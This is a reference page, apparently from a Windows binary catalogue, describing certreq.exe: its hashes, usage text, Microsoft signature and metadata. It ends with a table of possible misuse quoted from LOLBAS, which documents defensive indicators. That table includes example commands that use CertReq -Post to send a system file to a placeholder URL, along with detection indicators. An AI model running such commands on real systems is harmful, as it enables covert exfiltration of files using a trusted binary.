---
title: certreq.exe | CertReq.exe
excerpt: What is certreq.exe?
---

# certreq.exe 

* File Path: `C:\WINDOWS\system32\certreq.exe`
* Description: CertReq.exe

## Screenshot

![certreq.exe](screenshots/certreq.exe-81C07107AB05BD4C4AE1B7D889BCD4FE-2.png)

## Hashes

Type | Hash
-- | --
MD5 | `25682A89B34E1AB6A091E3CA43422F66`
SHA1 | `E497F8DF0D3DA116376562047AE381415A86392F`
SHA256 | `48ADEAF151B76D0B3628D95CAEB895E0A14E31100E4BFD6B299271605EDCD559`
SHA384 | `BD6D8408566984E06DB562954D8A2283A6FD46DE4CC8D7CDC4C199645AB80B3833B1102BBF71AE3C726ACD502EDD5923`
SHA512 | `41BB3B8A8B7C9BE5FA40295378FDFD634D5970AFFC43BCAD4304BB92EB1C33A6022283E5BA57A8B00C187699900BC565CC88DB319B96CBB4AD82608D058E94DF`
SSDEEP | `6144:oMX4IKyx+7VKP/v7MH5GNB1P1rTcSlsB/RMmwpJ9sr7GLhM1l:v4Ibx+7U3TKGflsUpjs+N`

## Runtime Data

### Usage (stdout):
```cmhg
Usage:
  CertReq -?
  CertReq [-v] -?
  CertReq [-Command] -?

  CertReq [-Submit] [Options] [RequestFileIn [CertFileOut [CertChainFileOut [FullResponseFileOut]]]]
    Submit a request to a Certification Authority.

  Options:
    -attrib AttributeString
    -binary
    -PolicyServer PolicyServer
    -config ConfigString
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -crl
    -rpc
    -AdminForceMachine
    -RenewOnBehalfOf
    -NoChallenge

  CertReq -Retrieve [Options] RequestId [CertFileOut [CertChainFileOut [FullResponseFileOut]]]
    Retrieve a response to a previous request from a Certification Authority.

  Options:
    -binary
    -PolicyServer PolicyServer
    -config ConfigString
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -crl
    -rpc
    -AdminForceMachine

  CertReq -New [Options] [PolicyFileIn [RequestFileOut]]
    Create a new request as directed by PolicyFileIn

  Options:
    -attrib AttributeString
    -binary
    -cert CertId
    -PolicyServer PolicyServer
    -config ConfigString
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -pin Pin
    -user
    -machine
    -xchg ExchangeCertFile

  CertReq -Accept [Options] [CertChainFileIn | FullResponseFileIn | CertFileIn]
    Accept and install a response to a previous new request.

  Options:
    -user 
    -machine 
    -pin Pin

  CertReq -Policy [Options] [RequestFileIn [PolicyFileIn [RequestFileOut [PKCS10FileOut]]]]
    Construct a cross certification or qualified subordination request
    from an existing CA certificate or from an existing request.

  Options:
    -attrib AttributeString
    -binary
    -cert CertId
    -PolicyServer PolicyServer
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -pin Pin
    -noEKU
    -AlternateSignatureAlgorithm
    -HashAlgorithm HashAlgorithm

  CertReq -Sign [Options] [RequestFileIn [RequestFileOut]]
    Sign a certificate request with an enrollment agent or qualified
    subordination signing certificate.

  Options:
    -binary
    -cert CertId
    -PolicyServer PolicyServer
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -pin Pin
    -crl
    -noEKU
    -HashAlgorithm HashAlgorithm

  CertReq -Enroll [Options] TemplateName
  CertReq -Enroll -cert CertId [Options] Renew [ReuseKeys]
    Enroll for or renew a certificate.

  Options:
    -PolicyServer PolicyServer
    -user 
    -machine 
    -pin Pin

  CertReq -EnrollAIK [Options] [KeyContainerName]
    Enroll for AIK certificate.

  Options:
    -config

  CertReq -EnrollCredGuardCert [Options] TemplateName [ExtensionInfFile]
    Enroll for machine account Credential Guard certificate.

  Options:
    -config

  CertReq -EnrollLogon [Options]
    Enroll for Hello for Business Logon certificate via ADFS.

  Options:
    -q

  CertReq -Post [Options]
    POST an http request.

  Options:
    -attrib AttributeString
    -config URL

Unknown argument: -help

```

### Child Processes:
conhost.exe

## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: CertReq.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.18362.1 (WinBuild.160101.0800)
* Product Version: 10.0.18362.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.



## Possible Misuse

*The following table contains possible examples of `certreq.exe` being misused. While `certreq.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `Name: CertReq.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Command: CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Command: CertReq -Post -config https://example.org/ c:\windows\win.ini and show response in terminal` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Path: C:\Windows\System32\certreq.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Path: C:\Windows\SysWOW64\certreq.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- IOC: certreq creates new files` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- IOC: certreq makes POST requests` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Link: https://dtm.uk/certreq` | 



MIT License. Copyright (c) 2020 Strontic.


